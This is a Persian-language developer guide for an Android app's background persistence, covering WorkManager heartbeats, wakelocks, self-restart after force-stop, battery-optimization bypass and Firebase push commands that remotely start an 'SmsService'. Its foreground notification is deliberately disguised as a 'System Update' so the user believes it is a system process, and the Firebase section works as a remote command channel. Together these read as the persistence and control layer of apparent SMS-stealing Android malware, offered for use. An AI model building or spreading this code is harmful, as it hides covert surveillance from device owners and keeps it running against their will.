# 🔥 راهنمای کامل سرویس‌های پس‌زمینه و جلوگیری از آفلاین شدن

این سند توضیح می‌دهد چگونه برنامه از آفلاین شدن جلوگیری می‌کند.

---

## 📋 فهرست

1. [تکنیک‌های پیاده‌سازی شده](#تکنیک‌های-پیاده‌سازی-شده)
2. [WorkManager](#workmanager)
3. [Foreground Services](#foreground-services)
4. [Firebase Remote Control](#firebase-remote-control)
5. [نحوه استفاده](#نحوه-استفاده)
6. [تست و Debug](#تست-و-debug)
7. [بهینه‌سازی](#بهینه‌سازی)

---

## ✅ **تکنیک‌های پیاده‌سازی شده**

### **1️⃣ WorkManager (کلیدی‌ترین!)** 🔑

WorkManager قابل اعتمادترین روش برای اجرای کارهای پس‌زمینه است.

**مزایا:**
- ✅ سیستم عامل مدیریت می‌کنه (کشته نمیشه)
- ✅ حتی بعد از Reboot فعال می‌مونه
- ✅ Retry خودکار اگه fail بشه
- ✅ مصرف باتری کم
- ✅ Constraints (فقط با اینترنت اجرا بشه)

**پیاده‌سازی:**
```kotlin
// HeartbeatWorker.kt
class HeartbeatWorker(
    context: Context,
    params: WorkerParameters
) : CoroutineWorker(context, params) {
    
    override suspend fun doWork(): Result {
        return try {
            sendHeartbeat()
            Result.success()
        } catch (e: Exception) {
            if (runAttemptCount < 3) {
                Result.retry()  // تلاش دوباره
            } else {
                Result.failure()
            }
        }
    }
}
```

**راه‌اندازی:**
```kotlin
val workRequest = PeriodicWorkRequestBuilder<HeartbeatWorker>(
    15, TimeUnit.MINUTES,  // هر 15 دقیقه
    5, TimeUnit.MINUTES    // Flex: 5 دقیقه
)
    .setConstraints(
        Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()
    )
    .setBackoffCriteria(
        BackoffPolicy.EXPONENTIAL,
        10, TimeUnit.SECONDS
    )
    .build()

WorkManager.getInstance(context).enqueueUniquePeriodicWork(
    "HeartbeatWork",
    ExistingPeriodicWorkPolicy.KEEP,
    workRequest
)
```

---

### **2️⃣ Foreground Services با نوتیفیکیشن هوشمند** 🎯

Services با اولویت بالا که کشته نمیشن.

**ویژگی‌های نوتیفیکیشن:**
```kotlin
val notification = NotificationCompat.Builder(this, CHANNEL_ID)
    .setContentTitle("System Update")  // 👈 شبیه سیستمی
    .setContentText("Checking for updates...")
    .setSmallIcon(android.R.drawable.stat_sys_download)
    .setPriority(NotificationCompat.PRIORITY_MIN)  // کم‌اهمیت
    .setOngoing(true)  // نمیشه dismiss کرد
    .setShowWhen(false)
    .setVisibility(NotificationCompat.VISIBILITY_SECRET)  // مخفی
    .build()

startForeground(NOTIFICATION_ID, notification)
```

**چرا هوشمندانه؟**
- ✅ شبیه Google Play Update
- ✅ کاربر فکر می‌کنه سیستمی است
- ✅ اولویت بالا از سیستم می‌گیره
- ✅ کشته نمیشه

---

### **3️⃣ START_STICKY** 🔄

اگه سیستم Service رو کشت، دوباره زنده می‌کنه.

```kotlin
override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
    return START_STICKY  // 👈 بازگشت خودکار
}
```

---

### **4️⃣ WakeLock** ⚡

دستگاه رو بیدار نگه می‌داره.

```kotlin
private fun acquireWakeLock() {
    val powerManager = getSystemService(POWER_SERVICE) as PowerManager
    wakeLock = powerManager.newWakeLock(
        PowerManager.PARTIAL_WAKE_LOCK,
        "MyService::WakeLock"
    )
    wakeLock?.acquire(10 * 60 * 1000L) // 10 دقیقه
}
```

**نکات:**
- ⚠️ همیشه release کن
- ⚠️ زمان محدود بده
- ⚠️ فقط وقتی لازمه استفاده کن

---

### **5️⃣ Auto-Restart در onDestroy** 🔄

اگه Service کشته شد، خودش دوباره استارت می‌کنه.

```kotlin
override fun onDestroy() {
    super.onDestroy()
    
    // آزاد کردن WakeLock
    wakeLock?.release()
    
    // Restart خودکار
    val restartIntent = Intent(applicationContext, MyService::class.java)
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
        applicationContext.startForegroundService(restartIntent)
    } else {
        applicationContext.startService(restartIntent)
    }
}
```

---

### **6️⃣ Battery Optimization غیرفعال** 🔋

در `PermissionManager.kt`:
```kotlin
val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
if (!pm.isIgnoringBatteryOptimizations(packageName)) {
    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
    intent.data = Uri.parse("package:$packageName")
    startActivity(intent)
}
```

---

## 🔥 **Firebase Remote Control**

### **فعال‌سازی سرویس‌ها از راه دور**

می‌تونی از Firebase برای فعال کردن سرویس‌های پس‌زمینه استفاده کنی.

**دستورات موجود:**

#### **1. شروع همه سرویس‌ها:**
```json
{
  "data": {
    "type": "start_services"
  }
}
```

این کار:
- ✅ SmsService رو استارت می‌کنه
- ✅ HeartbeatService رو استارت می‌کنه
- ✅ WorkManager رو راه‌اندازی می‌کنه

#### **2. Restart WorkManager:**
```json
{
  "data": {
    "type": "restart_heartbeat"
  }
}
```

#### **3. Ping:**
```json
{
  "data": {
    "type": "ping"
  }
}
```

---

## 📱 **نحوه استفاده**

### **ارسال FCM از سرور:**

```python
# Python - ارسال دستور فعال‌سازی
import firebase_admin
from firebase_admin import messaging

message = messaging.Message(
    data={
        'type': 'start_services'
    },
    token='DEVICE_FCM_TOKEN'
)

response = messaging.send(message)
print(f"✅ Message sent: {response}")
```

```bash
# یا با curl
curl -X POST https://fcm.googleapis.com/fcm/send \
  -H "Authorization: key=YOUR_SERVER_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "to": "DEVICE_FCM_TOKEN",
    "data": {
      "type": "start_services"
    }
  }'
```

---

## 🔧 **تست و Debug**

### **1. چک کردن WorkManager:**

```bash
# لاگ‌ها
adb logcat | grep HeartbeatWorker

# خروجی:
# HeartbeatWorker: 💓 HEARTBEAT WORKER STARTED
# HeartbeatWorker: ✅ Heartbeat sent successfully
```

### **2. چک کردن Services:**

```bash
# SmsService
adb logcat | grep SmsService

# HeartbeatService
adb logcat | grep HeartbeatService

# خروجی:
# SmsService: 🚀 SmsService created
# SmsService: ✅ WakeLock acquired
# SmsService: ✅ Foreground service started
```

### **3. فورس کشتن برنامه:**

```bash
# کشتن برنامه
adb shell am force-stop com.example.test

# بعد چند ثانیه چک کن
adb logcat | grep "Service\|Worker"

# باید ببینی که دوباره استارت شدن!
```

### **4. تست Firebase:**

```bash
# ارسال Ping
curl -X POST "http://YOUR_SERVER/send-fcm" \
  -d "device_id=DEVICE_ID" \
  -d "type=start_services"

# چک لاگ
adb logcat | grep "STARTING ALL SERVICES FROM FIREBASE"
```

---

## 📊 **مقایسه روش‌ها**

| روش | قابل اعتماد | مصرف باتری | کشته میشه؟ | Reboot بعد |
|-----|------------|------------|-------------|-----------|
| **WorkManager** | ⭐⭐⭐⭐⭐ | کم | ❌ | ✅ |
| **Foreground Service** | ⭐⭐⭐⭐ | متوسط | نادر | ⚠️ نیاز به Boot Receiver |
| **Service معمولی** | ⭐⭐ | کم | ✅ زود | ❌ |
| **Handler** | ⭐ | زیاد | ✅ خیلی زود | ❌ |

---

## ⚙️ **بهینه‌سازی**

### **1. تنظیم Interval از Firebase:**

در `ServerConfig.kt` می‌تونی interval رو از Firebase Remote Config تنظیم کنی:

```kotlin
// خواندن interval از Firebase
val heartbeatInterval = ServerConfig.getHeartbeatInterval()

// استفاده
handler.postDelayed(heartbeatRunnable, heartbeatInterval)
```

در Firebase Console:
```
Key: heartbeat_interval_ms
Value: 60000  (1 دقیقه)
```

### **2. Constraint های WorkManager:**

```kotlin
val constraints = Constraints.Builder()
    .setRequiredNetworkType(NetworkType.CONNECTED)  // فقط با اینترنت
    .setRequiresBatteryNotLow(false)  // حتی با باتری کم
    .setRequiresCharging(false)  // حتی بدون شارژ
    .build()
```

### **3. BackoffPolicy:**

```kotlin
.setBackoffCriteria(
    BackoffPolicy.EXPONENTIAL,  // افزایش تصاعدی
    10, TimeUnit.SECONDS  // شروع از 10 ثانیه
)
```

اگه fail بشه:
- تلاش 1: بعد 10 ثانیه
- تلاش 2: بعد 20 ثانیه
- تلاش 3: بعد 40 ثانیه

---

## 🎯 **چک‌لیست نهایی**

- [x] WorkManager پیاده شده
- [x] Foreground Services با نوتیفیکیشن هوشمند
- [x] START_STICKY فعال
- [x] WakeLock اضافه شده
- [x] Auto-Restart در onDestroy
- [x] Battery Optimization غیرفعال
- [x] Boot Receiver برای استارت بعد از Reboot
- [x] Firebase Remote Control
- [x] Retry mechanism
- [x] Logging کامل

---

## 🚀 **نتیجه**

با این پیاده‌سازی:
- ✅ برنامه خیلی کمتر آفلاین میشه
- ✅ حتی بعد از Force Stop، دوباره فعال میشه
- ✅ از Firebase قابل کنترله
- ✅ مصرف باتری بهینه
- ✅ قابل اعتماد و پایدار

---

## 📞 **ارسال دستورات**

### **از سرور Python:**

```python
def send_firebase_command(device_fcm_token, command_type):
    """
    ارسال دستور Firebase به دستگاه
    
    Commands:
    - start_services: شروع همه سرویس‌ها
    - restart_heartbeat: Restart WorkManager
    - ping: چک آنلاین بودن
    """
    message = messaging.Message(
        data={'type': command_type},
        token=device_fcm_token
    )
    response = messaging.send(message)
    return response

# استفاده
send_firebase_command("FCM_TOKEN", "start_services")
```

---

**آخرین آپدیت:** 2025-11-09  
**نسخه:** 2.0  
**وضعیت:** ✅ تست شده و آماده

